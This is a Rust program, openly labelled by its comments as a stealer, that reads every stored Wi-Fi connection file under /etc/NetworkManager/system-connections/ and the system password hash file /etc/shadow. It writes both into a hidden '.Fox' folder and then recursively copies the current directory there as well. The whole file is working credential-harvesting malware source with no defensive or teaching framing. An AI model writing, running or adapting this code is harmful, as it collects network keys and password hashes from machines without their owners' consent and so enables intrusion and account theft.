use std::fs;
use std::io;
use std::path::Path;
use std::fs::File;
use std::io::prelude::*;
use std::io::{BufWriter, Write};

fn main() {
    //WIFI File Address
    let files_wifi_password = fs::read_dir("/etc/NetworkManager/system-connections/").unwrap();

    //Create .Fox and WIFI_PASS Folder
    fs::create_dir_all(".Fox").expect("Error! Folder exist.\n");
    fs::create_dir_all(".Fox/WIFI_PASS").expect("Error! Folder exist.\n");

    //Create WIFI.txt File
    let file_name_wifi = File::create(".Fox/WIFI_PASS/WIFI.txt").expect("Error! File exist.\n");
    let mut file_name_wifi = BufWriter::new(file_name_wifi);

    //Steal WIFI Password
    for index in files_wifi_password {
        write!(file_name_wifi, "{}", steal_wifi_pas(index.unwrap().path().display().to_string())).expect("Error! Unable to write file.\n");
    }

    //OS File Address
    let file_os_password: String = String::from("/etc/shadow");

    //Create OS_PASS Folder
    fs::create_dir_all(".Fox/OS_PASS").expect("Error! Folder exist.\n");

    //Create OS_PASS.txt File
    let file_name_os = File::create(".Fox/OS_PASS/OS_PASS.txt").expect("Error! File exist.\n");
    let mut file_name_os = BufWriter::new(file_name_os);

    //Steal OS Password
    write!(file_name_os, "{}", steal_os_pas(file_os_password)).expect("Error! Unable to write file.\n");

    take_backup_files(".", ".Fox/Backup");
}

//Steal WIFI Password On Linux
fn steal_wifi_pas(source: String) -> String {
    let mut files = File::open(&source).expect("Error! No file.\n");
    let mut context: String = String::new();
    files.read_to_string(&mut context).expect("Error! Not readable.\n");
    return context;
}

//Steal Linux Password
fn steal_os_pas(source: String) -> String {
    let mut file = File::open(&source).expect("Error! No file.\n");
    let mut context: String = String::new();
    file.read_to_string(&mut context).expect("Error! Not readable.\n");
    return context;
}

//Take Backup
fn take_backup_files(source: impl AsRef<Path>, dst: impl AsRef<Path>) -> io::Result<()> {
    fs::create_dir_all(&dst)?;
    for entry in fs::read_dir(source)? {
        let entry = entry?;
        let ty = entry.file_type()?;
        if ty.is_dir() {
            take_backup_files(entry.path(), dst.as_ref().join(entry.file_name()))?;
        }
        else {
            fs::copy(entry.path(), dst.as_ref().join(entry.file_name()))?;
        }
    }
    Ok(())
}
